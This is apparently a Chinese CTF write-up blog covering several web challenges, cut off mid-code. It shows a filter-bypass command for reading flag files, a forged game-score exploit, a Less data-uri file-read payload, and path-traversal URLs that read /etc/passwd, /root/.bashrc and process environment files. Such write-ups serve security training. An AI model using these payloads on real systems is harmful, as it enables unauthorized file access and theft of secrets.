<span class="keyword">die</span>(<span class="string">&quot;大胆！！！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">assert</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>说要读flaggg.txt，但是用了很多正则waf。<br>首先，读文件除了<br><code>cat|tac|more|less|head|tail|nl|sed|sort|uniq|rev|awk|od|vi|vim</code><br>以外，还有一个<br><code>paste</code></p>
<p>之后，waf没有屏蔽<code>/</code>，所以可以直接读根目录</p>
<p>然后，waf只是屏蔽了双字<code>fl</code>和<code>ag</code>，以及句号。所以可以直接</p>
<p><code>paste /f*</code></p>
<p>直接读取所有根目录下f开头的文件。</p>
<h2 id="SCUCTF2023"><a href="#SCUCTF2023" class="headerlink" title="SCUCTF2023"></a>SCUCTF2023</h2><h3 id="2048"><a href="#2048" class="headerlink" title="2048"></a>2048</h3><p>一眼抓包改包。直接玩失败先抓个包。</p>
<p>网页查看源代码，游戏逻辑在里面。里面判断游戏结果是否有效的代码在这里。直接破解这个函数就可以了。</p>
<p>逆向一个js就行，那个验证的字符串是这个：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> secret = <span class="title function_">generateRandomString</span>(<span class="number">32</span>);</span><br><span class="line">    <span class="keyword">var</span> hashed = <span class="title function_">sm3</span>(secret + <span class="string">&#x27;_&#x27;</span> + score)</span><br><span class="line">    <span class="keyword">var</span> encrypted = sm4.<span class="title function_">encrypt</span>(hashed, secret);</span><br><span class="line">    <span class="keyword">var</span> data = &#123;</span><br><span class="line">        encrypted,</span><br><span class="line">        score,</span><br><span class="line">        secret</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>Exp：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;encrypt&#125; = <span class="built_in">require</span>(<span class="string">&quot;sm-crypto/src/sm4&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> sm3 = <span class="built_in">require</span>(<span class="string">&#x27;sm-crypto&#x27;</span>).<span class="property">sm3</span>;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * secret 已知</span></span><br><span class="line"><span class="comment"> * encrypted = sm4.encrypt(hashed, secret); 已知</span></span><br><span class="line"><span class="comment"> * score 已知</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">secret = <span class="string">&quot;BF7trRp8BUds83GxK62Kk6OXpRgQgwD0&quot;</span>;</span><br><span class="line">score = <span class="number">999999999999</span>;</span><br><span class="line">before_hash = secret+<span class="string">&#x27;_&#x27;</span>+score;</span><br><span class="line">hashed = <span class="title function_">sm3</span>(before_hash) </span><br><span class="line">encrypted = sm4.<span class="title function_">encrypt</span>(hashed,secret)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(encrypted);</span><br></pre></td></tr></table></figure>

<h3 id="lessismore"><a href="#lessismore" class="headerlink" title="lessismore"></a>lessismore</h3><h4 id="前期调研和信息搜集"><a href="#前期调研和信息搜集" class="headerlink" title="前期调研和信息搜集"></a>前期调研和信息搜集</h4><p>给了个less参数让输入less代码进去编译</p>
<p>payload长度不能太长</p>
<p>被过滤了的字符：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">;</span><br><span class="line">#</span><br><span class="line">&quot;</span><br><span class="line">&#x27;</span><br><span class="line">[]</span><br><span class="line">*</span><br><span class="line">$</span><br><span class="line">!</span><br><span class="line">@</span><br><span class="line">_</span><br><span class="line">=</span><br><span class="line">\</span><br><span class="line">|</span><br><span class="line">?</span><br><span class="line">.</span><br><span class="line">&lt;&gt;</span><br><span class="line">~</span><br><span class="line">空格</span><br><span class="line">&amp;</span><br></pre></td></tr></table></figure>
<p>没被过滤的字符：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">()</span><br><span class="line">&#123;&#125;</span><br><span class="line">/</span><br><span class="line">-</span><br><span class="line">,</span><br><span class="line">+</span><br></pre></td></tr></table></figure>

<h4 id="Less文档研读"><a href="#Less文档研读" class="headerlink" title="Less文档研读"></a>Less文档研读</h4><p>仔细阅读less文档，发现了data-uri()函数。它可以读文件，如</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data-<span class="title function_">uri</span>(<span class="string">&#x27;../data/image.jpg&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>那么既然不让用单双引号，那就得看字符串相关的函数了，如何构造“&#x2F;flag&#x2F;flag”。</p>
<p>e的文档说明是这样的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">String escaping.</span><br><span class="line"></span><br><span class="line">It expects string as a parameter and return its content as is, but without quotes. It can be used to output CSS value which is either not valid CSS syntax, or uses proprietary syntax which Less doesn&#x27;t recognize.</span><br><span class="line"></span><br><span class="line">Parameters: string - a string to escape.</span><br><span class="line"></span><br><span class="line">Returns: string - the escaped string, without quotes.</span><br></pre></td></tr></table></figure>

<p>“It expects string as a parameter”。一个提示说“1&#x2F;1”，尝试输入个“1&#x2F;1”，输出居然是空字符串。（经我测试，输入0和1-1也是空字符串）</p>
<p>然后就是replace()函数。一开始并没有仔细看这个函数，因为它的文档里是这样写的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Parameters:</span><br><span class="line"></span><br><span class="line">string: The string to search and replace in.</span><br><span class="line">pattern: A string or regular expression pattern to search for.</span><br><span class="line">replacement: The string to replace the matched pattern with.</span><br><span class="line">flags: (Optional) regular expression flags.</span><br><span class="line">Returns: a string with the replaced values.</span><br><span class="line"></span><br><span class="line">Example:</span><br><span class="line">    replace(&quot;Hello, Mars?&quot;, &quot;Mars\?&quot;, &quot;Earth!&quot;);</span><br><span class="line">    replace(&quot;One + one = 4&quot;, &quot;one&quot;, &quot;2&quot;, &quot;gi&quot;);</span><br><span class="line">    replace(&#x27;This is a string.&#x27;, &quot;(string)\.$&quot;, &quot;new $1.&quot;);</span><br><span class="line">    replace(~&quot;bar-1&quot;, &#x27;1&#x27;, &#x27;2&#x27;);</span><br><span class="line"></span><br><span class="line">Result:</span><br><span class="line">    &quot;Hello, Earth!&quot;;</span><br><span class="line">    &quot;2 + 2 = 4&quot;;</span><br><span class="line">    &#x27;This is a new string.&#x27;;</span><br><span class="line">    bar-2;</span><br></pre></td></tr></table></figure>

<p>但是，<strong>它的参数居然可以不带引号</strong>！也就是说<strong>可以把不带引号的内容放进去，其输出还是string</strong>！，</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">replace</span>(bflagbflag,a,<span class="string">&#x27;/&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>的结果就是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/flagbflag</span><br></pre></td></tr></table></figure>

<p>replace()函数的文档里写着：有一个可选参数“flags”，用于正则表达。比如，g代表全局替换，i代表不区分大小写，等等。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">replace</span>(bflagbflag,a,<span class="string">&#x27;/&#x27;</span>,g)</span><br></pre></td></tr></table></figure>

<p>的结果就是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/flag/flag</span><br></pre></td></tr></table></figure>
<h4 id="payload编写"><a href="#payload编写" class="headerlink" title="payload编写"></a>payload编写</h4><p>我们需要构造</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">h5&#123;</span><br><span class="line">    <span class="attr">color</span>: data-<span class="title function_">uri</span>(<span class="string">&#x27;/flag/flag&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么就很简单了,replace(bflagbflag,b,’&#x2F;‘,g)，返回的是个字符串，那么data-uri()就能识别，然后返回flag。现在就是构造一个’&#x2F;‘就可以。</p>
<p>直接replace(a&#x2F;a,a,e(0),g)会报错。说明不能直接这样做。那么，就通过直接replace(a,a,b&#x2F;b)的方式，让b&#x2F;b转换为字符串。然后再把b替换成e(0)即可。replace(replace(a,a,b&#x2F;b),b,e(0),g)，最后构造出的是一个’&#x2F;‘。但是这样又有一个问题：会多出多余的空格。那么，看提示的“1&#x2F;1”，将payload改为replace(replace(a,a,1&#x2F;1),1,e(0),g)，成功消除空格。</p>
<p>在拼接h5{color:data-uri(replace(bflagbflag,b,replace(replace(a,a,1&#x2F;1),1,e(0),g),g))}后，发现又太长了。那么就缩减类名和属性名，直接缩减到一个字符。</p>
<p>最终的payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?less=h&#123;c:data-uri(replace(bflagbflag,b,replace(replace(a,a,1/1),1,e(0),g),g))&#125;</span><br></pre></td></tr></table></figure>

<p>成功编译。在源代码下看到了style的输出。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> h &#123;</span><br><span class="line">  c: url(&amp;#34;data:application/octet-stream;base64,c2N1Y3Rme2VhMTc0NWUxLTliNWEtNDQyOS04YzkwLWMzNzFlNzEyNzg4Mn0K&amp;#34;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对c2N1Y3Rme2VhMTc0NWUxLTliNWEtNDQyOS04YzkwLWMzNzFlNzEyNzg4Mn0K进行base64解码，得到flag。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">scuctf&#123;ea1745e1-9b5a-4429-8c90-c371e7127882&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="用到的资源"><a href="#用到的资源" class="headerlink" title="用到的资源"></a>用到的资源</h4><ol>
<li><a target="_blank" rel="noopener" href="https://lesscss.org/functions/#string-functions-replace">less文档</a></li>
<li><a target="_blank" rel="noopener" href="https://lesscss.org/less-preview/">less在线编译</a></li>
<li><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Learn/CSS">css教程(只是看了看css基本语法)</a></li>
</ol>
<h3 id="tarit"><a href="#tarit" class="headerlink" title="tarit"></a>tarit</h3><h4 id="调研和信息搜集"><a href="#调研和信息搜集" class="headerlink" title="调研和信息搜集"></a>调研和信息搜集</h4><p>扫后台，发现有个<code>/hello</code>。但这个貌似在这道题我这个方法没啥用<br>Wapplyzer分析是flask框架，说明是python</p>
<p>上传一个文档，发现有个read的路径，接受一个file参数。尝试直接读<code>/etc/hosts</code>，失败，发现是过滤 <code>..</code> 。 </p>
<h4 id="方案尝试"><a href="#方案尝试" class="headerlink" title="方案尝试"></a>方案尝试</h4><p>双写绕过</p>
<p><code>....//....//....///etc/passwd</code></p>
<p>随便写个1.html，然后压个恶意tar包尝试路径穿越<br><code>sudo tar cPvf midi.tar ../../../../../../../../../etc/test/1.html</code><br>成功渲染 说明可以嵌入东西进去</p>
<p>嵌了一段xss代码进去发现好像不行</p>
<p>apache 和 nginx 配置文件读不了</p>
<p><code>http://223.129.86.2:34411/read?file=....//....//....//....////proc/self/environ</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HOSTNAME=9603fdf5e3e3</span><br><span class="line">PYTHON_PIP_VERSION=23.0.1</span><br><span class="line">HOME=/root</span><br><span class="line">GPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D</span><br><span class="line">PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/9af82b715db434abb94a0a6f3569f43e72157346/public/get-pip.py</span><br><span class="line">PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">GZCTF_FLAG=NO_FLAG</span><br><span class="line">LANG=C.UTF-8</span><br><span class="line">PYTHON_VERSION=3.7.17</span><br><span class="line">PYTHON_SETUPTOOLS_VERSION=57.5.0</span><br><span class="line">PWD=/app</span><br><span class="line">PYTHON_GET_PIP_SHA256=45a2bb8bf2bb5eff16fdd00faef6f29731831c7c59bd9fc2bf1f3bed511ff1fe</span><br></pre></td></tr></table></figure>

<p>HOME&#x3D;&#x2F;root 疑似直接用root执行的。</p>
<p><code>http://223.129.86.2:34411/read?file=....//....//....//....////proc/self/cmdline</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pythonapp.pyc</span><br></pre></td></tr></table></figure>


<p>执行的命令是一个pythonapp.pyc</p>
<p><code>http://223.129.86.2:34411/read?file=....//....//....//....////root/.bashrc</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># ~/.bashrc: executed by bash(1) for non-login shells. </span><br><span class="line"># Note: PS1 and umask are already set in /etc/profile. You should not </span><br><span class="line"># need this unless you want different defaults for root. </span><br><span class="line"># PS1=&#x27;$&#123;debian_chroot:+($debian_chroot)&#125;\h:\w\$ &#x27; </span><br><span class="line"># umask 022 </span><br><span class="line"># You may uncomment the following lines if you want `ls&#x27; to be colorized: </span><br><span class="line"># export LS_OPTIONS=&#x27;--color=auto&#x27; </span><br><span class="line"># eval &quot;$(dircolors)&quot; </span><br><span class="line"># alias ls=&#x27;ls $LS_OPTIONS&#x27; </span><br><span class="line"># alias ll=&#x27;ls $LS_OPTIONS -l&#x27; </span><br><span class="line"># alias l=&#x27;ls $LS_OPTIONS -lA&#x27; </span><br><span class="line"># </span><br><span class="line"># Some more alias to avoid making mistakes: </span><br><span class="line"># alias rm=&#x27;rm -i&#x27; </span><br><span class="line"># alias cp=&#x27;cp -i&#x27; </span><br><span class="line"># alias mv=&#x27;mv -i&#x27;</span><br></pre></td></tr></table></figure>


<p><code>http://223.129.86.2:34411/read?file=....//....//....//....////proc/loadavg</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0.03 0.07 0.17 1/1041 155591</span><br></pre></td></tr></table></figure>


<h4 id="最终解决方式"><a href="#最终解决方式" class="headerlink" title="最终解决方式"></a>最终解决方式</h4><p><code>http://43.136.40.245:1389///read?file=....//....//....//....////proc/[pid]/environ</code></p>
<p>burp直接爆破每个pid的环境变量。</p>
<p>在[pid]&#x3D;1的环境变量里有：<br><code>GZCTF_FLAG=SCUCTF&#123;aa385d7c-a457-4642-9dcf-a45fbc2c61fc&#125;</code></p>
<h3 id="WebBuilder"><a href="#WebBuilder" class="headerlink" title="WebBuilder"></a>WebBuilder</h3><p>打开页面，发现提示。是要写一个后端，并且对机器人发动xss攻击。</p>
<h4 id="审计代码：对API的测试"><a href="#审计代码：对API的测试" class="headerlink" title="审计代码：对API的测试"></a>审计代码：对API的测试</h4><p>打开附件，这里是注册API的地方。服务器可以自己选择http和https，非常智能。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/register/:domain&#x27;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">params</span>.<span class="title function_">hasOwnProperty</span>(<span class="string">&#x27;domain&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">let</span> resp, data;</span><br><span class="line">        <span class="keyword">const</span> domain = req.<span class="property">params</span>.<span class="property">domain</span></span><br><span class="line">        <span class="keyword">const</span> scheme = domain.<span class="title function_">includes</span>(<span class="string">&#x27;ngrok&#x27;</span>) ? <span class="string">&#x27;https&#x27;</span> : <span class="string">&#x27;http&#x27;</span>;</span><br><span class="line">        <span class="keyword">const</span> url = <span class="string">`<span class="subst">$&#123;scheme&#125;</span>://<span class="subst">$&#123;domain&#125;</span>/`</span>;</span><br></pre></td></tr></table></figure>

<p>接下来是对后端的第一个测试，测试的API是&#x2F;test，传了一个get参数，name。<br>第一步要求是必须能访问。这里可以直接本地搭一个flask做后端，ngrok进行一个反向代理，不用折腾vps，非常方便。<br>第二步要求是必须要返回content-type，且必须是application&#x2F;json；<br>第三步要求是必须返回body，且有俩参数，一个是len，一个是code，一个是len。code的长度需要与name字符串的长度相同；而name字符串又是rand函数的随机值。同时检查状态码是否为200。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 你的api需要经过如下检测</span></span><br><span class="line">        <span class="comment">// test the first api: http://domain/test?name=xxx</span></span><br><span class="line">        <span class="keyword">const</span> rand = <span class="title function_">randGenerate</span>(<span class="number">10</span>, <span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            (&#123;resp, data&#125; = <span class="keyword">await</span> <span class="title function_">sendRequest</span>(url + <span class="string">&quot;test?name=&quot;</span> + rand, &#123;<span class="string">&#x27;headers&#x27;</span>: &#123;&#125;&#125;));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(err);</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">`<span class="subst">$&#123;url&#125;</span> test api error`</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> contentType = resp.<span class="property">headers</span>[<span class="string">&#x27;content-type&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (contentType !== <span class="string">&#x27;application/json&#x27;</span>) &#123; <span class="comment">//必须是application/json</span></span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&quot;content-type should be application/json&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> body = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(data);</span><br><span class="line">        <span class="keyword">let</span> len = body[<span class="string">&#x27;len&#x27;</span>]; <span class="comment">//code的长度需要与name字符串的长度相同</span></span><br><span class="line">        <span class="keyword">let</span> code = body[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (len !== rand.<span class="property">length</span> || code !== <span class="number">200</span>) &#123; <span class="comment">//状态码是否为200</span></span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&quot;len or code wrong&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>接下来是第二道检查。四个检查，有一个随机测试，如果是奇数则把referer设置为<a target="_blank" rel="noopener" href="http://evil之类的(非本域名下的),要求返回状态码是404,返回信息为“this/">http://evil之类的（非本域名下的），要求返回状态码是404，返回信息为“this</a> is forbidden”；偶数就设置referer为本url，要求返回状态码为302，并且跳转到url&#x2F;success。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test the second api: http://domain/redirect</span></span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">           <span class="keyword">const</span> choice = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="number">10</span>) % <span class="number">2</span> === <span class="number">0</span></span><br><span class="line">           <span class="keyword">const</span> options = &#123;</span><br><span class="line">               <span class="attr">headers</span>: &#123;</span><br><span class="line">                   <span class="string">&#x27;Referer&#x27;</span>: choice ? url : <span class="string">&#x27;http://evil/&#x27;</span></span><br><span class="line">               &#125;</span><br><span class="line">           &#125;;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">try</span> &#123;</span><br><span class="line">               (&#123;resp, data&#125; = <span class="keyword">await</span> <span class="title function_">sendRequest</span>(url + <span class="string">&quot;redirect&quot;</span>, options));</span><br><span class="line">           &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">               res.<span class="title function_">send</span>(<span class="string">`<span class="subst">$&#123;url&#125;</span> redirect api error`</span>);</span><br><span class="line">               <span class="keyword">return</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">const</span> statusCode = resp.<span class="property">statusCode</span>;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (choice) &#123;</span><br><span class="line">               <span class="comment">// Even Num for http://domain/ 偶数的时候</span></span><br><span class="line">               <span class="keyword">if</span> (statusCode === <span class="number">302</span>) &#123; <span class="comment">// 要求返回状态码为302</span></span><br><span class="line">                   <span class="keyword">if</span> (resp.<span class="property">headers</span>[<span class="string">&#x27;location&#x27;</span>] !== <span class="string">`<span class="subst">$&#123;url&#125;</span>success`</span>) &#123; <span class="comment">//跳转到url/success。</span></span><br><span class="line">                       res.<span class="title function_">send</span>(<span class="string">&quot;location wrong&quot;</span>);</span><br><span class="line">                       <span class="keyword">return</span>;</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">                   res.<span class="title function_">send</span>(<span class="string">&quot;status code should be 302 qwq&quot;</span>);</span><br><span class="line">                   <span class="keyword">return</span>;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="comment">// Odd Num for http://evil</span></span><br><span class="line">               <span class="keyword">if</span> (statusCode === <span class="number">404</span>) &#123; <span class="comment">// 要求返回状态码是404</span></span><br><span class="line">                   <span class="keyword">if</span> (data !== <span class="string">&#x27;this is forbidden&#x27;</span>) &#123;  <span class="comment">// 返回信息为“this is forbidden”</span></span><br><span class="line">                       res.<span class="title function_">send</span>(<span class="string">&quot;Forbidden Me :)&quot;</span>);</span><br><span class="line">                       <span class="keyword">return</span>;</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   res.<span class="title function_">send</span>(<span class="string">&quot;status code should be 404 qwq&quot;</span>); </span><br><span class="line">                   <span class="keyword">return</span>;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>

<p>接下来是第三段测试。尝试sendRequest。</p>
<blockquote>
<p>await 操作符用于等待一个 Promise 兑现并获取它兑现之后的值。它只能在异步函数或者模块顶层中使用。</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test the third api: http://domain/js</span></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           (&#123;_, data&#125; = <span class="keyword">await</span> <span class="title function_">sendRequest</span>(url + <span class="string">&quot;js&quot;</span>, &#123;<span class="string">&#x27;headers&#x27;</span>: &#123;&#125;&#125;));</span><br><span class="line">       &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">           res.<span class="title function_">send</span>(<span class="string">`<span class="subst">$&#123;url&#125;</span> js api error`</span>);</span><br><span class="line">           <span class="keyword">return</span>;</span><br><span class="line">       &#125;  </span><br></pre></td></tr></table></figure>

<p>那么看一下sendRequest函数。函数中非常智能地去除了ngrok警告，非常温柔。</p>
<p>这段函数的主要功能是获取所有的data内容。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">sendRequest</span>(<span class="params">url, opts</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        opts[<span class="string">&#x27;headers&#x27;</span>][<span class="string">&#x27;ngrok-skip-browser-warning&#x27;</span>] = <span class="string">&quot;69420&quot;</span> <span class="comment">// 去除ngrok警告</span></span><br><span class="line">        <span class="keyword">let</span> sender;</span><br><span class="line">        <span class="keyword">if</span> (url.<span class="title function_">includes</span>(<span class="string">&quot;https&quot;</span>)) &#123;</span><br><span class="line">            opts[<span class="string">&#x27;rejectUnauthorized&#x27;</span>] = <span class="literal">false</span></span><br><span class="line">            sender = https;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            sender = http;</span><br><span class="line">        &#125;</span><br><span class="line">        sender.<span class="title function_">get</span>(url, opts, <span class="function">(<span class="params">resp</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> data = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            resp.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">chunk</span>) =&gt;</span> &#123;</span><br><span class="line">                data += 